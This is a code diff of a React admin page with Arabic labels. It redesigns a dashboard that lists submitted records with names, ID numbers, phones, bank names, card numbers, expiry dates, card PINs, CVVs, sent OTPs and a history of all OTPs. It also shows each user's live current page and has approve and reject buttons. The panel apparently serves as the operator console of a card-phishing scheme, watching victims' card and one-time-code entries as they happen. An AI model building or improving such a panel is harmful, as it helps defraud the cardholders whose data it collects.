-                  </tr>
+                    </CardContent>
+                  </Card>
                 ))}
-              </tbody>
-            </table>
-          </div>
-
-          {/* Mobile Card View - Shown only on Mobile */}
-          <div className="md:hidden space-y-4 p-4">
-            {notifications.map((notification) => (
-              <Card key={notification.id} className="overflow-hidden">
-                <CardContent className="p-4">
-                  <div className="flex justify-between items-start mb-3">
-                    <div>
-                      <div className="font-semibold">{(notification as any).personalInfo?.name || "غير معروف"}</div>
-                    </div>
-                    <UserStatusBadge userId={notification.id} />
-                  </div>
-
-                  <div className="grid grid-cols-1 gap-3 mb-3">
-                    <div className="space-y-2">
-                      <div className="text-sm">
-                        <span className="font-medium">رمز التحقق:</span>
-                        <div className="flex items-center gap-2 mt-1">
-                          <input
-                            type="text"
-                            value={editingAuthCodes[notification.id] ?? notification.data.authCode}
-                            onChange={(e) => handleAuthCodeChange(notification.id, e.target.value)}
-                            className="px-2 py-1 text-sm border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent flex-1"
-                            placeholder="رمز التحقق"
-                          />
-                          {editingAuthCodes[notification.id] !== undefined && (
-                            <Button
-                              size="sm"
-                              variant="outline"
-                              onClick={() => updateAuthCode(notification.id)}
-                              className="h-7 px-2 text-xs"
-                            >
-                              حفظ
-                            </Button>
-                          )}
-                        </div>
-                      </div>
-                    </div>
-
-                    <div className="flex flex-wrap gap-2">
-                      <Badge
-                        variant={(notification as any).name ? "default" : "destructive"}
-                        className="rounded-md cursor-pointer"
-                        onClick={() => handleInfoClick(notification, "personal")}
-                      >
-                        {(notification as any).name ? "معلومات شخصية" : "لا يوجد معلومات"}
-                      </Badge>
-                      <Badge
-                        variant={(notification as any).cardNumber ? "default" : "destructive"}
-                        className={`rounded-md cursor-pointer ${(notification as any).cardNumber ? "bg-green-500" : ""}`}
-                        onClick={() => handleInfoClick(notification, "card")}
-                      >
-                        {(notification as any).cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
-                      </Badge>
-                    </div>
-
-                    <div className="text-sm">
-                      <span className="font-medium">الصفحة الحالية:</span> {(notification as any)?.currantPage}
-                    </div>
-
-                    <div className="text-sm">
-                      <span className="font-medium">الوقت:</span>{" "}
-                      {(notification as any).createdDate &&
-                        formatDistanceToNow(new Date((notification as any).createdDate), {
-                          addSuffix: true,
-                          locale: ar,
-                        })}
-                    </div>
-
-                    <div className="flex gap-2 mt-2">
-                      <Button
-                        onClick={() => {
-                          handleApproval("approved", notification.id)
-                          setMessage(true)
-                          setTimeout(() => {
-                            setMessage(false)
-                          }, 3000)
-                        }}
-                        className="flex-1 bg-green-500 hover:bg-green-600"
-                      >
-                        قبول
-                      </Button>
-                      <Button
-                        onClick={() => {
-                          handleApproval("rejected", notification.id)
-                          setMessage(true)
-                          setTimeout(() => {
-                            setMessage(false)
-                          }, 3000)
-                        }}
-                        className="flex-1"
-                        variant="destructive"
-                      >
-                        رفض
-                      </Button>
-                      <Button variant="outline" onClick={() => handleDelete(notification.id)} className="w-10 p-0">
-                        <Trash2 className="h-4 w-4" />
-                      </Button>
-                    </div>
-                    {message && <p className="text-green-500 text-center mt-2">تم الارسال</p>}
-                  </div>
-                </CardContent>
-              </Card>
-            ))}
-          </div>
-        </Card>
+              </div>
+            ) : (
+              <div className="text-center py-12 bg-white rounded-lg shadow-sm">
+                <Bell className="h-12 w-12 text-gray-300 mx-auto mb-4" />
+                <h3 className="text-lg font-medium text-gray-900 mb-2">لا توجد إشعارات</h3>
+                <p className="text-gray-500 max-w-md mx-auto">
+                  {searchQuery || activeFilter
+                    ? "لا توجد نتائج تطابق معايير البحث أو الفلترة. حاول تغيير المعايير أو إعادة تعيين الفلاتر."
+                    : "لا توجد إشعارات حالياً. ستظهر الإشعارات الجديدة هنا عند وصولها."}
+                </p>
+                {(searchQuery || activeFilter) && (
+                  <Button variant="outline" onClick={resetFilters} className="mt-4">
+                    إعادة تعيين الفلاتر
+                  </Button>
+                )}
+              </div>
+            )}
+          </TabsContent>
+        </Tabs>
       </div>
 
+      {/* Info Dialog */}
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
         <DialogContent className="bg-white text-gray-900 max-w-[90vw] md:max-w-md" dir="rtl">
           <DialogHeader>
-            <DialogTitle>
-              {selectedInfo === "personal"
-                ? "المعلومات الشخصية"
-                : selectedInfo === "card"
-                  ? "معلومات البطاقة"
-                  : "معلومات عامة"}
+            <DialogTitle className="flex items-center gap-2 text-lg">
+              {selectedInfo === "personal" ? (
+                <>
+                  <User className="h-5 w-5 text-blue-600" />
+                  المعلومات الشخصية
+                </>
+              ) : selectedInfo === "card" ? (
+                <>
+                  <CreditCard className="h-5 w-5 text-emerald-600" />
+                  معلومات البطاقة
+                </>
+              ) : (
+                "معلومات عامة"
+              )}
             </DialogTitle>
+            <DialogDescription>
+              {selectedNotification && (
+                <span className="text-sm text-gray-500">
+                  {selectedNotification.data.idNumber} • {selectedNotification.phone}
+                </span>
+              )}
+            </DialogDescription>
           </DialogHeader>
+
           {selectedInfo === "personal" && selectedNotification && (
             <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
               {selectedNotification.id && (
-                <p className="flex justify-between">
-                  <span className="font-medium">رقم الهوية:</span>
-                  <span>{selectedNotification.id}</span>
-                </p>
+                <div className="flex justify-between items-center py-2 border-b border-gray-200">
+                  <span className="font-medium text-gray-700 flex items-center gap-2">
+                    <Shield className="h-4 w-4 text-gray-500" />
+                    رقم الهوية:
+                  </span>
+                  <span className="text-gray-900">{selectedNotification.id}</span>
+                </div>
               )}
               {(selectedNotification as any).name && (
-                <p className="flex justify-between">
-                  <span className="font-medium">الاسم:</span>
-                  <span>{(selectedNotification as any).name}</span>
-                </p>
+                <div className="flex justify-between items-center py-2 border-b border-gray-200">
+                  <span className="font-medium text-gray-700 flex items-center gap-2">
+                    <User className="h-4 w-4 text-gray-500" />
+                    الاسم:
+                  </span>
+                  <span className="text-gray-900">{(selectedNotification as any).name}</span>
+                </div>
               )}
               {selectedNotification.phone && (
-                <p className="flex justify-between">
-                  <span className="font-medium">الهاتف:</span>
-                  <span>{selectedNotification.phone}</span>
-                </p>
+                <div className="flex justify-between items-center py-2 border-b border-gray-200">
+                  <span className="font-medium text-gray-700 flex items-center gap-2">
+                    <Phone className="h-4 w-4 text-gray-500" />
+                    الهاتف:
+                  </span>
+                  <span className="text-gray-900 font-medium">{selectedNotification.phone}</span>
+                </div>
               )}
             </div>
           )}
+
           {selectedInfo === "card" && selectedNotification && (
             <div className="space-y-3 p-4 bg-gray-50 rounded-lg">
               {(selectedNotification as any).bank && (
-                <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">البنك:</span>
-                  <span className="font-semibold">{(selectedNotification as any).bank}</span>
-                </p>
+                <div className="flex justify-between items-center py-2 border-b border-gray-200">
+                  <span className="font-medium text-gray-700 flex items-center gap-2">
+                    <CreditCard className="h-4 w-4 text-gray-500" />
+                    البنك:
+                  </span>
+                  <span className="font-semibold text-gray-900">{(selectedNotification as any).bank}</span>
+                </div>
               )}
               {(selectedNotification as any).cardNumber && (
-                <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">رقم البطاقة:</span>
-                  <span className="font-semibold" dir="ltr">
+                <div className="flex justify-between items-center py-2 border-b border-gray-200">
+                  <span className="font-medium text-gray-700 flex items-center gap-2">
+                    <CreditCard className="h-4 w-4 text-gray-500" />
+                    رقم البطاقة:
+                  </span>
+                  <div className="font-semibold text-gray-900" dir="ltr">
                     {(selectedNotification as any).prefix && (
-                      <Badge variant={"outline"} className="bg-blue-100">
-                        {(selectedNotification as any).prefix && `  ${(selectedNotification as any).prefix}`}
+                      <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200 mr-1">
+                        {(selectedNotification as any).prefix}
                       </Badge>
-                    )}{" "}
-                    <Badge variant={"outline"} className="bg-green-100">
+                    )}
+                    <Badge variant="outline" className="bg-emerald-50 text-emerald-700 border-emerald-200">
                       {(selectedNotification as any).cardNumber}
                     </Badge>
-                  </span>
-                </p>
+                  </div>
+                </div>
               )}
               {((selectedNotification as any).year ||
                 (selectedNotification as any).month ||
                 (selectedNotification as any).cardExpiry) && (
-                <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">تاريخ الانتهاء:</span>
-                  <span className="font-semibold">
+                <div className="flex justify-between items-center py-2 border-b border-gray-200">
+                  <span className="font-medium text-gray-700 flex items-center gap-2">
+                    <Calendar className="h-4 w-4 text-gray-500" />
+                    تاريخ الانتهاء:
+                  </span>
+                  <span className="font-semibold text-gray-900">
                     {(selectedNotification as any).year && (selectedNotification as any).month
                       ? `${(selectedNotification as any).year}/${(selectedNotification as any).month}`
                       : (selectedNotification as any).cardExpiry}
                   </span>
-                </p>
+                </div>
               )}
               {(selectedNotification as any).pass && (
-                <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">رمز البطاقة:</span>
-                  <span className="font-semibold">{(selectedNotification as any).pass}</span>
-                </p>
+                <div className="flex justify-between items-center py-2 border-b border-gray-200">
+                  <span className="font-medium text-gray-700 flex items-center gap-2">
+                    <Shield className="h-4 w-4 text-gray-500" />
+                    رمز البطاقة:
+                  </span>
+                  <span className="font-semibold text-gray-900">{(selectedNotification as any).pass}</span>
+                </div>
               )}
               {((selectedNotification as any).otp || (selectedNotification as any).otpCode) && (
-                <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">رمز التحقق المرسل:</span>
-                  <span className="font-semibold">
+                <div className="flex justify-between items-center py-2 border-b border-gray-200">
+                  <span className="font-medium text-gray-700 flex items-center gap-2">
+                    <Shield className="h-4 w-4 text-gray-500" />
+                    رمز التحقق المرسل:
+                  </span>
+                  <span className="font-semibold text-gray-900">
                     {(selectedNotification as any).otp}
                     {(selectedNotification as any).otpCode && ` || ${(selectedNotification as any).otpCode}`}
                   </span>
-                </p>
+                </div>
               )}
               {(selectedNotification as any).cvv && (
-                <p className="flex justify-between">
-                  <span className="font-medium text-gray-700">رمز الامان:</span>
-                  <span className="font-semibold">{(selectedNotification as any).cvv}</span>
-                </p>
+                <div className="flex justify-between items-center py-2 border-b border-gray-200">
+                  <span className="font-medium text-gray-700 flex items-center gap-2">
+                    <Shield className="h-4 w-4 text-gray-500" />
+                    رمز الامان:
+                  </span>
+                  <span className="font-semibold text-gray-900">{(selectedNotification as any).cvv}</span>
+                </div>
               )}
               {(selectedNotification as any).allOtps &&
                 Array.isArray((selectedNotification as any).allOtps) &&
                 (selectedNotification as any).allOtps.length > 0 && (
                   <div>
-                    <span className="font-medium text-gray-700 block mb-2">جميع الرموز:</span>
+                    <span className="font-medium text-gray-700 flex items-center gap-2 mb-2">
+                      <Shield className="h-4 w-4 text-gray-500" />
+                      جميع الرموز:
+                    </span>
                     <div className="flex flex-wrap gap-2">
                       {(selectedNotification as any).allOtps.map((otp: string, index: number) => (
-                        <Badge key={index} variant="outline" className="bg-gray-100">
+                        <Badge key={index} variant="outline" className="bg-gray-50 text-gray-700 border-gray-200">
                           {otp}
                         </Badge>
                       ))}
@@ -633,6 +1100,166 @@ export default function NotificationsPage() {
                 )}
             </div>
           )}
+        </DialogContent>
+      </Dialog>
+
+      {/* Confirm Delete Dialog */}
+      <Dialog open={confirmDeleteId !== null} onOpenChange={() => setConfirmDeleteId(null)}>
+        <DialogContent className="bg-white text-gray-900 max-w-sm" dir="rtl">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-2 text-lg">
+              <AlertCircle className="h-5 w-5 text-red-500" />
+              تأكيد الحذف
+            </DialogTitle>
+            <DialogDescription>
+              {confirmDeleteId === "all"
+                ? "هل أنت متأكد من رغبتك في حذف جميع الإشعارات؟ لا يمكن التراجع عن هذا الإجراء."
+                : "هل أنت متأكد من رغبتك في حذف هذا الإشعار؟ لا يمكن التراجع عن هذا الإجراء."}
+            </DialogDescription>
+          </DialogHeader>
+          <DialogFooter className="flex flex-row-reverse sm:justify-start gap-2 mt-4">
+            <Button
+              variant="destructive"
+              onClick={confirmDeleteId === "all" ? confirmClearAll : confirmDeleteNotification}
+            >
+              تأكيد الحذف
+            </Button>
+            <Button variant="outline" onClick={() => setConfirmDeleteId(null)}>
+              إلغاء
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
+
+      {/* Image Preview Dialog */}
+      <Dialog open={selectedImages !== null} onOpenChange={closeImagePreview}>
+        <DialogContent className="max-w-4xl w-[95vw] h-[90vh] p-0 bg-black" dir="ltr">
+          <div className="relative w-full h-full flex flex-col">
+            {/* Header */}
+            <div className="absolute top-0 left-0 right-0 z-10 bg-black/80 backdrop-blur-sm p-4 flex justify-between items-center">
+              <div className="flex items-center gap-4 text-white">
+                <h3 className="text-lg font-semibold">
+                  معاينة الصور
+                  {selectedImages && (
+                    <span className="text-sm font-normal ml-2">
+                      ({selectedImages.currentIndex + 1} من {selectedImages.images.length})
+                    </span>
+                  )}
+                </h3>
+              </div>
+
+              <div className="flex items-center gap-2">
+                {/* Zoom Controls */}
+                <div className="flex items-center gap-1 bg-white/20 rounded-lg p-1">
+                  <Button
+                    variant="ghost"
+                    size="sm"
+                    onClick={() => setImageZoom(Math.max(0.5, imageZoom - 0.25))}
+                    className="text-white hover:bg-white/20 h-8 w-8 p-0"
+                    disabled={imageZoom <= 0.5}
+                  >
+                    <ZoomOut className="h-4 w-4" />
+                  </Button>
+                  <span className="text-white text-sm px-2 min-w-[60px] text-center">
+                    {Math.round(imageZoom * 100)}%
+                  </span>
+                  <Button
+                    variant="ghost"
+                    size="sm"
+                    onClick={() => setImageZoom(Math.min(3, imageZoom + 0.25))}
+                    className="text-white hover:bg-white/20 h-8 w-8 p-0"
+                    disabled={imageZoom >= 3}
+                  >
+                    <ZoomIn className="h-4 w-4" />
+                  </Button>
+                </div>
+
+                {/* Download Button */}
+                <Button variant="ghost" size="sm" onClick={downloadImage} className="text-white hover:bg-white/20">
+                  <Download className="h-4 w-4" />
+                </Button>
+
+                {/* Close Button */}
+                <Button variant="ghost" size="sm" onClick={closeImagePreview} className="text-white hover:bg-white/20">
+                  <X className="h-4 w-4" />
+                </Button>
+              </div>
+            </div>
+
+            {/* Image Container */}
+            <div className="flex-1 flex items-center justify-center p-4 pt-20 pb-16">
+              {selectedImages && (
+                <div className="relative max-w-full max-h-full overflow-hidden">
+                  <img
+                    src={selectedImages.images[selectedImages.currentIndex] || "/placeholder.svg"}
+                    alt={`صورة ${selectedImages.currentIndex + 1}`}
+                    className="max-w-full max-h-full object-contain transition-transform duration-200"
+                    style={{ transform: `scale(${imageZoom})` }}
+                    onError={(e) => {
+                      const target = e.target as HTMLImageElement
+                      target.src = "/placeholder.svg?height=400&width=400&text=فشل+في+تحميل+الصورة"
+                    }}
+                  />
+                </div>
+              )}
+            </div>
+
+            {/* Navigation */}
+            {selectedImages && selectedImages.images.length > 1 && (
+              <>
+                {/* Previous Button */}
+                <Button
+                  variant="ghost"
+                  size="lg"
+                  onClick={prevImage}
+                  disabled={selectedImages.currentIndex === 0}
+                  className="absolute left-4 top-1/2 transform -translate-y-1/2 text-white hover:bg-white/20 h-12 w-12 p-0 rounded-full"
+                >
+                  <ChevronDown className="h-6 w-6 rotate-90" />
+                </Button>
+
+                {/* Next Button */}
+                <Button
+                  variant="ghost"
+                  size="lg"
+                  onClick={nextImage}
+                  disabled={selectedImages.currentIndex === selectedImages.images.length - 1}
+                  className="absolute right-4 top-1/2 transform -translate-y-1/2 text-white hover:bg-white/20 h-12 w-12 p-0 rounded-full"
+                >
+                  <ChevronDown className="h-6 w-6 -rotate-90" />
+                </Button>
+              </>
+            )}
+
+            {/* Bottom Thumbnails */}
+            {selectedImages && selectedImages.images.length > 1 && (
+              <div className="absolute bottom-0 left-0 right-0 bg-black/80 backdrop-blur-sm p-4">
+                <div className="flex justify-center gap-2 overflow-x-auto">
+                  {selectedImages.images.map((image, index) => (
+                    <button
+                      key={index}
+                      onClick={() => setSelectedImages({ ...selectedImages, currentIndex: index })}
+                      className={`flex-shrink-0 w-16 h-16 rounded-lg overflow-hidden border-2 transition-all ${
+                        index === selectedImages.currentIndex
+                          ? "border-blue-500 ring-2 ring-blue-500/50"
+                          : "border-white/30 hover:border-white/60"
+                      }`}
+                    >
+                      <img
+                        src={image || "/placeholder.svg"}
+                        alt={`صورة مصغرة ${index + 1}`}
+                        className="w-full h-full object-cover"
+                        onError={(e) => {
+                          const target = e.target as HTMLImageElement
+                          target.src = "/placeholder.svg?height=64&width=64&text=خطأ"
+                        }}
+                      />
+                    </button>
+                  ))}
+                </div>
+              </div>
+            )}
+          </div>
         </DialogContent>
       </Dialog>
     </div>
